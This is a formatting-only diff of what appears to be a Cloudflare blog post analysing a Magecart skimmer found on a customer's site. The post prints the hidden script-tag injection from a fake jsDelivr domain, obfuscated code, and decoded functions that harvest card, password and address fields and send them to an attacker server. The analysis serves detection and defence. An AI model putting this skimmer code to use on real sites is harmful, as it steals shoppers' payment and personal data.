@@ -1,35 +1,43 @@
-<div class="mb2 gray5">6 min read</div>
+<div class="mb2 gray5">5 min read</div>
 <div class="post-content lh-copy gray1">
-	<figure class="kg-card kg-image-card"><img src="https://blog.cloudflare.com/content/images/2024/03/Navigating-the-Maze-of-Magecart.png" class="kg-image" alt="" loading="lazy" width="1600" height="900"></figure>
+	<figure class="kg-card kg-image-card ">
+
+		<img src="https://cf-assets.www.cloudflare.com/slt3lc6tev37/1Aw23Koy0YCP5D15lpptuE/f03d75dd350bb3cc350d241247299b6a/Navigating-the-Maze-of-Magecart.png" alt="" class="kg-image" width="1600" height="900" loading="lazy">
+
+	</figure>
 	<p>The Cloudflare security research team reviews and evaluates scripts flagged by <a href="https://developers.cloudflare.com/page-shield">Cloudflare Page Shield</a>, focusing particularly on those with low scores according to our machine learning (ML) model, as <a href="https://developers.cloudflare.com/page-shield/how-it-works/malicious-script-detection/#malicious-script-detection">low scores indicate the model thinks they are malicious</a>. It was during one of these routine reviews that we stumbled upon a peculiar script on a customer’s website, one that was being fetched from a zone unfamiliar to us, a new and uncharted territory in our digital map.</p>
 	<p>This script was not only obfuscated but exhibited some suspicious behavior, setting off alarm bells within our team. Its complexity and the mysterious nature piqued our curiosity, and we decided to delve deeper, to unravel the enigma of what this script was truly up to.</p>
 	<p>In our quest to decipher the script's purpose, we geared up to dissect its layers, determined to shed light on its hidden intentions and understand the full scope of its actions.</p>
 	<p>The Infection Mechanism: A seemingly harmless HTML <code>div</code> element housed a piece of JavaScript, a trojan horse lying in wait.</p>
-	<figure class="kg-card kg-code-card">
-		<pre><code>&lt;div style="display: none; visibility: hidden;"&gt;
-&lt;script src="//cdn.jsdelivr.at/js/sidebar.min.js"&gt;&lt;/script&gt;
-&lt;/div&gt;</code></pre>
-		<figcaption><em>The script was the conduit for the malicious activities</em></figcaption>
-	</figure>
-	<h2 id="the-devil-in-the-details">The devil in the details</h2>
+	<pre class="language-bash"><code class="language-bash"><div style="display: none; visibility: hidden;">
+<script src="//cdn.jsdelivr.at/js/sidebar.min.js"></script>
+</div></code></pre>
+	<p><i>The script was the conduit for the malicious activities</i></p>
+	<h2>The devil in the details</h2>
 	<p>The script hosted at the aforementioned domain was a piece of obfuscated JavaScript, a common tactic used by attackers to hide their malicious intent from casual observation. The obfuscated code can be examined in detail through the <a href="https://radar.cloudflare.com/scan/6cc5856d-f16d-496d-bfe0-f635bd75bec8/summary">snapshot</a> provided by Cloudflare Radar URL Scanner.</p>
-	<p>Obfuscated script snippet: </p><!--kg-card-begin: markdown-->
-	<pre><code class="language-JavaScript">function _0x5383(_0x411252,_0x2f6ba1){var _0x1d211f=_0x1d21();return _0x5383=function(_0x5383da,_0x5719da){_0x5383da=_0x5383da-0x101;var _0x3d97e9=_0x1d211f[_0x5383da];return _0x3d97e9;},_0x5383(_0x411252,_0x2f6ba1);}var _0x11e3ed=_0x5383;(function(_0x3920b4,_0x32875c){var _0x3147a9=_0x5383,_0x5c373e=_0x3920b4();while(!![]){try{var _0x5e0fb6=-parseInt(_0x3147a9(0x13e))/0x1*(parseInt(_0x3147a9(0x151))/0x2)+parseInt(_0x3147a9(0x168))/0x3*(parseInt(_0x3147a9(0x136))/0x4)+parseInt(_0x3147a9(0x15d))/0x5*(parseInt(_0x3147a9(0x152))/0x6)+-parseInt(_0x3147a9(0x169))/0x7*(-parseInt(_0x3147a9(0x142))/0x8)+parseInt(_0x3147a9(0x143))/0x9+-parseInt(_0x3147a9(0x14b))/0xa+-parseInt(_0x3147a9(0x150))/0xb;if(_0x5e0fb6===_0x32875c)break;else _0x5c373e['push'](_0x5c373e['shift']());}catch(_0x1f0719){_0x5c373e['push'](_0x5c373e['shift']());}}}(_0x1d21,0xbc05c));function _0x1d21(){var _0x443323=['3439548foOmOf',
-.....
-</code></pre>
-	<!--kg-card-end: markdown-->
-	<p>The primary objective of this script was to steal Personally Identifiable Information (PII), including credit card details. The stolen data was then transmitted to a server controlled by the attackers, located at https://jsdelivr[.]at/f[.]php.</p>
-	<h2 id="decoding-the-malicious-domain">Decoding the malicious domain</h2>
+	<p>Obfuscated script snippet:</p>
+	<pre class="language-javascript"><code class="language-javascript">function _0x5383(_0x411252,_0x2f6ba1){var _0x1d211f=_0x1d21();return _0x5383=function(_0x5383da,_0x5719da){_0x5383da=_0x5383da-0x101;var _0x3d97e9=_0x1d211f[_0x5383da];return _0x3d97e9;},_0x5383(_0x411252,_0x2f6ba1);}var _0x11e3ed=_0x5383;(function(_0x3920b4,_0x32875c){var _0x3147a9=_0x5383,_0x5c373e=_0x3920b4();while(!![]){try{var _0x5e0fb6=-parseInt(_0x3147a9(0x13e))/0x1*(parseInt(_0x3147a9(0x151))/0x2)+parseInt(_0x3147a9(0x168))/0x3*(parseInt(_0x3147a9(0x136))/0x4)+parseInt(_0x3147a9(0x15d))/0x5*(parseInt(_0x3147a9(0x152))/0x6)+-parseInt(_0x3147a9(0x169))/0x7*(-parseInt(_0x3147a9(0x142))/0x8)+parseInt(_0x3147a9(0x143))/0x9+-parseInt(_0x3147a9(0x14b))/0xa+-parseInt(_0x3147a9(0x150))/0xb;if(_0x5e0fb6===_0x32875c)break;else _0x5c373e['push'](_0x5c373e['shift']());}catch(_0x1f0719){_0x5c373e['push'](_0x5c373e['shift']());}}}(_0x1d21,0xbc05c));function _0x1d21(){var _0x443323=['3439548foOmOf',
+.....</code></pre>
+	<p>The primary objective of this script was to steal Personally Identifiable Information (PII), including credit card details. The stolen data was then transmitted to a server controlled by the attackers, located at <a href="https://jsdelivr/[./]at/f/[./]php">https://jsdelivr\[.\]at/f\[.\]php</a>.</p>
+	<h2>Decoding the malicious domain</h2>
 	<p>Before diving deeper into the exact behaviors of a script, examining the hosted domain and its insights could already reveal valuable arguments for overall evaluation. Regarding the hosted domain <code>cdn.jsdelivr.at</code> used in this script:</p>
 	<ul>
-		<li>It was registered on 2022-04-14.</li>
-		<li>It impersonates the well-known hosting service <a href="https://www.jsdelivr.com">jsDelivr</a>, which is hosted at <code>cdn.jsdelivr.net</code>.</li>
-		<li>It was registered by 1337team Limited, a company known for providing bulletproof hosting services. These services are frequently utilized in various cybercrime campaigns due to their resilience against law enforcement actions and their ability to host illicit activities without interruption.</li>
-		<li>Previous mentions of this hosting provider, such as in a tweet by <a href="https://twitter.com/malwrhunterteam/status/1374703390748520448">@malwrhunterteam</a>, highlight its involvement in cybercrime activities. This further emphasizes the reputation of 1337team Limited in the cybercriminal community and its role in facilitating malicious campaigns.</li>
+		<li>
+			<p>It was registered on 2022-04-14.</p>
+		</li>
+		<li>
+			<p>It impersonates the well-known hosting service <a href="https://www.jsdelivr.com">jsDelivr</a>, which is hosted at <code>cdn.jsdelivr.net</code>.</p>
+		</li>
+		<li>
+			<p>It was registered by 1337team Limited, a company known for providing bulletproof hosting services. These services are frequently utilized in various cybercrime campaigns due to their resilience against law enforcement actions and their ability to host illicit activities without interruption.</p>
+		</li>
+		<li>
+			<p>Previous mentions of this hosting provider, such as in a tweet by <a href="https://twitter.com/malwrhunterteam/status/1374703390748520448">@malwrhunterteam</a>, highlight its involvement in cybercrime activities. This further emphasizes the reputation of 1337team Limited in the cybercriminal community and its role in facilitating malicious campaigns.</p>
+		</li>
 	</ul>
-	<h2 id="decoding-the-malicious-script">Decoding the malicious script</h2>
+	<h2>Decoding the malicious script</h2>
 	<p>Data Encoding and Decoding Functions: The script uses two functions, <code>wvnso.jzzys</code> and <code>wvnso.cvdqe</code>, for encoding and decoding data. They employ Base64 and URL encoding techniques, common methods in malware to conceal the real nature of the data being sent.</p>
-	<pre><code class="language-js">var wvnso = {
+	<pre class="language-js"><code class="language-js">var wvnso = {
   "jzzys": function (_0x5f38f3) {
     return btoa(encodeURIComponent(_0x5f38f3).replace(/%([0-9A-F]{2})/g, function (_0x7e416, _0x1cf8ee) {
       return String.fromCharCode('0x' + _0x1cf8ee);
@@ -39,13 +47,11 @@
     return decodeURIComponent(Array.prototype.map.call(atob(_0x4fdcee), function (_0x273fb1) {
       return '%' + ('00' + _0x273fb1.charCodeAt(0x0).toString(0x10)).slice(-0x2);
     }).join(''));
-  }
-</code></pre>
+  }</code></pre>
 	<p>Targeted Data Fields: The script is designed to identify and monitor specific input fields on the website. These fields include sensitive information like credit card numbers, names, email addresses, and other personal details. The <code>wvnso.cwwez</code> function maps these fields, showing that the attackers had carefully studied the website’s layout.</p>
-	<pre><code class="language-js">"cwwez": window.JSON.parse(wvnso.cvdqe("W1siZmllbGQiLCAiaWZyYW1lIiwgMCwgIm4iLCAiTnVtYmVyIl0sIFsibmFtZSIsICJmaXJzdG5hbWUiLCAwLCAiZiIsICJIb2xkZXIiXSwgWyJuYW1lIiwgImxhc3RuYW1lIiwgMCwgImwiLCAiSG9sZGVyIl0sIFsiZmllbGQiLCAiaWZyYW1lIiwgMCwgImUiLCAiRGF0ZSJdLCBbImZpZWxkIiwgImlmcmFtZSIsIDAsICJjIiwgIkNWViJdLCBbImlkIiwgImN1c3RvbWVyLWVtYWlsIiwgMCwgImVsIiwgImVtYWlsIl0sIFsibmFtZSIsICJ0ZWxlcGhvbmUiLCAwLCAicGUiLCAicGhvbmUiXSwgWyJuYW1lIiwgImNpdHkiLCAwLCAiY3kiLCAiY2l0eSJdLCBbIm5hbWUiLCAicmVnaW9uX2lkIiwgMywgInNlIiwgInN0YXRlIl0sIFsibmFtZSIsICJyZWdpb24iLCAwLCAic2UiLCAic3RhdGUiXSwgWyJuYW1lIiwgImNvdW50cnlfaWQiLCAwLCAiY3QiLCAiQ291bnRyeSJdLCBbIm5hbWUiLCAicG9zdGNvZGUiLCAwLCAienAiLCAiWmlwIl0sIFsiaWQiLCAiY3VzdG9tZXItcGFzc3dvcmQiLCAwLCAicGQiLCAicGFzc3dvcmQiXSwgWyJuYW1lIiwgWyJzdHJlZXRbMF0iLCAic3RyZWV0WzFdIiwgInN0cmVldFsyXSJdLCAwLCAiYXMiLCAiYWRkciJdXQ==")),
-</code></pre>
+	<pre class="language-js"><code class="language-js">"cwwez": window.JSON.parse(wvnso.cvdqe("W1siZmllbGQiLCAiaWZyYW1lIiwgMCwgIm4iLCAiTnVtYmVyIl0sIFsibmFtZSIsICJmaXJzdG5hbWUiLCAwLCAiZiIsICJIb2xkZXIiXSwgWyJuYW1lIiwgImxhc3RuYW1lIiwgMCwgImwiLCAiSG9sZGVyIl0sIFsiZmllbGQiLCAiaWZyYW1lIiwgMCwgImUiLCAiRGF0ZSJdLCBbImZpZWxkIiwgImlmcmFtZSIsIDAsICJjIiwgIkNWViJdLCBbImlkIiwgImN1c3RvbWVyLWVtYWlsIiwgMCwgImVsIiwgImVtYWlsIl0sIFsibmFtZSIsICJ0ZWxlcGhvbmUiLCAwLCAicGUiLCAicGhvbmUiXSwgWyJuYW1lIiwgImNpdHkiLCAwLCAiY3kiLCAiY2l0eSJdLCBbIm5hbWUiLCAicmVnaW9uX2lkIiwgMywgInNlIiwgInN0YXRlIl0sIFsibmFtZSIsICJyZWdpb24iLCAwLCAic2UiLCAic3RhdGUiXSwgWyJuYW1lIiwgImNvdW50cnlfaWQiLCAwLCAiY3QiLCAiQ291bnRyeSJdLCBbIm5hbWUiLCAicG9zdGNvZGUiLCAwLCAienAiLCAiWmlwIl0sIFsiaWQiLCAiY3VzdG9tZXItcGFzc3dvcmQiLCAwLCAicGQiLCAicGFzc3dvcmQiXSwgWyJuYW1lIiwgWyJzdHJlZXRbMF0iLCAic3RyZWV0WzFdIiwgInN0cmVldFsyXSJdLCAwLCAiYXMiLCAiYWRkciJdXQ==")),</code></pre>
 	<p>Data Harvesting Logic: The script uses a set of complex functions ( <code>wvnso.uvesz</code>, &nbsp;<code>wvnso.wsrmf</code>, etc.) to check each targeted field for user input. When it finds the data it wants (like credit card details), it collects ("harvests") this data and gets it ready to be sent out ("exfiltrated").</p>
-	<pre><code class="language-js">"uvesz": function (_0x52b255) {
+	<pre class="language-js"><code class="language-js">"uvesz": function (_0x52b255) {
     for (var _0x356fbe = 0x0; _0x356fbe &lt; wvnso.cwwez.length; _0x356fbe++) {
       var _0x25348a = wvnso.cwwez[_0x356fbe];
       if (_0x52b255.hasAttribute(_0x25348a[0x0])) {
@@ -74,8 +80,8 @@
       }
     }
   }</code></pre>
-	<p>Stealthy Data Exfiltration: After harvesting the data, the script sends it secretly to the attacker's server (located at https://jsdelivr[.]at/f[.]php). This process is done in a way that mimics normal Internet traffic, making it hard to detect. It creates an Image HTML element programmatically (not displayed to the user) and sets its src attribute to a specific URL. This URL is the attacker's server where the stolen data is sent.</p>
-	<pre><code class="language-js">"eubtc": function () {
+	<p>Stealthy Data Exfiltration: After harvesting the data, the script sends it secretly to the attacker's server (located at <a href="https://jsdelivr/[./]at/f/[./]php">https://jsdelivr\[.\]at/f\[.\]php</a>). This process is done in a way that mimics normal Internet traffic, making it hard to detect. It creates an Image HTML element programmatically (not displayed to the user) and sets its src attribute to a specific URL. This URL is the attacker's server where the stolen data is sent.</p>
+	<pre class="language-js"><code class="language-js">"eubtc": function () {
     var _0x4b786d = wvnso.jzzys(window.JSON.stringify(wvnso.krwon));
     if (wvnso.pqemy() &amp;&amp; !(wvnso.rnhok.indexOf(_0x4b786d) != -0x1)) {
       wvnso.rnhok.push(_0x4b786d);
@@ -85,10 +91,9 @@
   }</code></pre>
 	<p>Persistent Monitoring: The script keeps a constant watch on user input. This means that any data entered into the targeted fields is captured, not just when the page first loads, but continuously as long as the user is on the page.</p>
 	<p>Execution Interval: The script is set to activate its data-collecting actions at regular intervals, as shown by the <code>window.setInterval(wvnso.bumdr, 0x1f4)</code> function call. This ensures that it constantly checks for new user input on the site.</p>
-	<pre><code class="language-js">window.setInterval(wvnso.bumdr, 0x1f4);
-</code></pre>
+	<pre class="language-js"><code class="language-js">window.setInterval(wvnso.bumdr, 0x1f4);</code></pre>
 	<p>Local Data Storage: Interestingly, the script uses local storage methods (wvnso.hajfd, wvnso.ijltb) to keep the collected data on the user's device. This could be a way to prevent data loss in case there are issues with the Internet connection or to gather more data before sending it to the server.</p>
-	<pre><code class="language-js">"ijltb": function () {
+	<pre class="language-js"><code class="language-js">"ijltb": function () {
     var _0x19c563 = wvnso.jzzys(window.JSON.stringify(wvnso.krwon));
     window.localStorage.setItem("oybwd", _0x19c563);
   },
@@ -99,21 +104,28 @@
     }
   }</code></pre>
 	<p>This JavaScript code is a sophisticated tool for stealing sensitive information from users. It's well-crafted to avoid detection, gather detailed information, and transmit it discreetly to a remote server controlled by the attackers.</p>
-	<h2 id="proactive-detection">Proactive detection</h2>
+	<h2>Proactive detection</h2>
 	<p><a href="https://blog.cloudflare.com/detecting-magecart-style-attacks-for-pageshield">Page Shield's existing machine learning algorithm</a> is capable of automatically detecting malicious JavaScript code. As cybercriminals evolve their attack methods, we are constantly improving our detection and defense mechanisms. An upcoming version of our ML model, an artificial neural network, has been designed to maintain high recall (i.e., identifying the many different types of malicious scripts) while also providing a low false positive rate (i.e., reducing false alerts for benign code). The new version of Page Shield's ML automatically flagged the above script as a Magecart type attack with a very high probability. In other words, our ML correctly identified a novel attack script operating in the wild! Cloudflare <a href="https://developers.cloudflare.com/page-shield/get-started">customers with Page Shield enabled</a> will soon be able to take further advantage of our latest ML's superior protection for client-side security. Stay tuned for more details.</p>
-	<h2 id="what-you-can-do">What you can do</h2>
+	<h2>What you can do</h2>
 	<p>The attack on a Cloudflare customer is a sobering example of the Magecart threat. It underscores the need for constant vigilance and robust client-side security measures for websites, especially those handling sensitive user data. This incident is a reminder that cybersecurity is not just about protecting data but also about safeguarding the trust and well-being of users.</p>
 	<p>We recommend the following actions to <a href="https://www.cloudflare.com/products/zero-trust/threat-defense">enhance security and protect against similar threats</a>. Our comprehensive security model includes several products specifically designed to safeguard web applications and sensitive data:</p>
 	<ol>
-		<li><a href="https://www.cloudflare.com/learning/ddos/glossary/web-application-firewall-waf"><strong>Implement WAF Managed Rule Product</strong></a>: This solution offers robust protection against known attacks by monitoring and filtering HTTP traffic between a web application and the Internet. It effectively guards against common web exploits.</li>
-		<li><a href="https://blog.cloudflare.com/tag/waf-attack-score"><strong>Deploy ML-Based WAF Attack Score</strong></a>: Our ML-based WAF, known as <strong>Attack Score</strong>, is specifically engineered to defend against previously unknown attacks. It uses advanced machine learning algorithms to analyze web traffic patterns and identify potential threats, providing an additional layer of security against sophisticated and emerging threats.</li>
-		<li><strong>Use</strong><a href="https://www.cloudflare.com/application-services/products/page-shield"><strong> Page Shield</strong></a>: Page Shield is designed to protect against Magecart-style attacks and browser supply chain threats. It monitors and secures third-party scripts running on your website, helping you identify malicious activity and proactively prevent client-side attacks, such as theft of sensitive customer data. This tool is crucial for preventing data breaches originating from compromised third-party vendors or scripts running in the browser.</li>
-		<li><a href="https://developers.cloudflare.com/waf/managed-rules"><strong>Activate Sensitive Data Detection (SDD)</strong></a>: <strong>SDD</strong> alerts you if certain sensitive data is being exfiltrated from your website, whether due to an attack or a configuration error. This feature is essential for maintaining compliance with data protection regulations and for promptly addressing any unauthorized data leakage.</li>
+		<li>
+			<p><a href="https://www.cloudflare.com/learning/ddos/glossary/web-application-firewall-waf"><b>Implement WAF Managed Rule Product</b></a>: This solution offers robust protection against known attacks by monitoring and filtering HTTP traffic between a web application and the Internet. It effectively guards against common web exploits.</p>
+		</li>
+		<li>
+			<p><a href="https://blog.cloudflare.com/tag/waf-attack-score"><b>Deploy ML-Based WAF Attack Score</b></a>: Our ML-based WAF, known as <b>Attack Score</b>, is specifically engineered to defend against previously unknown attacks. It uses advanced machine learning algorithms to analyze web traffic patterns and identify potential threats, providing an additional layer of security against sophisticated and emerging threats.</p>
+		</li>
+		<li>
+			<p><b>Use</b> <a href="https://www.cloudflare.com/application-services/products/page-shield"><b>Page Shield</b></a>: Page Shield is designed to protect against Magecart-style attacks and browser supply chain threats. It monitors and secures third-party scripts running on your website, helping you identify malicious activity and proactively prevent client-side attacks, such as theft of sensitive customer data. This tool is crucial for preventing data breaches originating from compromised third-party vendors or scripts running in the browser.</p>
+		</li>
+		<li>
+			<p><a href="https://developers.cloudflare.com/waf/managed-rules"><b>Activate Sensitive Data Detection (SDD)</b></a>: <b>SDD</b> alerts you if certain sensitive data is being exfiltrated from your website, whether due to an attack or a configuration error. This feature is essential for maintaining compliance with data protection regulations and for promptly addressing any unauthorized data leakage.</p>
+		</li>
 	</ol>
-	<p>....</p><!--kg-card-begin: markdown-->
-	<p><sup>1</sup><br>
-		[1]: <a href="https://www.team-cymru.com/post/seychelles-seychelles-on-the-c-2-shore">https://www.team-cymru.com/post/seychelles-seychelles-on-the-c-2-shore</a><br>
-		[2]: <a href="https://www.bizcommunity.com/Article/196/661/241908.html">https://www.bizcommunity.com/Article/196/661/241908.html</a><br>
-		[3]: <a href="https://nationaldailyng.com/trend-micro-teams-up-with-interpol-to-fight-african-cybercrime-networks">https://nationaldailyng.com/trend-micro-teams-up-with-interpol-to-fight-african-cybercrime-networks/</a></p>
-	<!--kg-card-end: markdown-->
+	<p>....</p>
+	<p><sup>1</sup></p>
+	<p>[1]: <a href="https://www.team-cymru.com/post/seychelles-seychelles-on-the-c-2-shore">https://www.team-cymru.com/post/seychelles-seychelles-on-the-c-2-shore</a></p>
+	<p>[2]: <a href="https://www.bizcommunity.com/Article/196/661/241908.html">https://www.bizcommunity.com/Article/196/661/241908.html</a></p>
+	<p>[3]: <a href="https://nationaldailyng.com/trend-micro-teams-up-with-interpol-to-fight-african-cybercrime-networks">https://nationaldailyng.com/trend-micro-teams-up-with-interpol-to-fight-african-cybercrime-networks/</a></p>
 </div>
